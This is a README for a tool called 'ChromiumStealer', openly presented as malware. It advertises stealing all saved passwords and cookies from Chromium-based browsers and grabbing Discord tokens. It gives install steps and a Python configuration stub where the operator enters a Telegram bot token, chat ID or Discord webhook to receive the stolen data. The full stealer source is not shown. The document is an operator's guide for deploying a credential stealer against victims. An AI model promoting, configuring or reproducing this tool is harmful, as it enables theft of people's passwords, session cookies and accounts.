# ChromiumStealer
# FEATURES
-STEALS all Passwords from all Chromium based Browsers\
-STEALS all Cookies from all Chromium based Browsers\
-GRABS all Discord-Tokens stored on the PC (supports discord newest "token encryption")

-RECEIVE the info via Telegram bot API\
and/or\
-RECEIVE the info via Discord webhook

# EXAMPLE
![alt text](https://i.imgur.com/CVrMpsS.png)
![alt text](https://i.imgur.com/ZPwsFEy.png)

# SUPPORTED BROWSERS
```Chrome```\
```Brave```\
```Edge```\
```Opera```\
```Opera GX```

# HOW TO
open cmd terminal and paste in: ```pip install -r requirements.txt```

```py
def post_to(file):
    token = "TELEGRAM TOKEN"     # put your token in here, if you don't wanna use telegram leave it like it is
    chat_id = "TELEGRAM CHATID"  # "        chatid          "                     telegram      "
    webhook_url = "WEBHOOK URL"  # "        webhook         "                     discord       "
    # if you don't understand it you shouldn't use it
```

edit code in line 225, 226 and/or 227
if you don't understand it you shouldn't use it,\
just add your TELEGRAM TOKEN, CHATID and/or your DISCORD WEBHOOK into these 3 lines


# REQUIREMENTS
```pycryptodomex```\
```pysqlite3```\
```pypiwin32```\
```requests```

# TO DO
implement firefox, i wan't to make everything as compact as i can and firefox would double everything up\
still searching for a smart compact way to do it, will update if i found somethin

# Legal
MIT License

Copyright (c) 2022 Dominik Müller

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
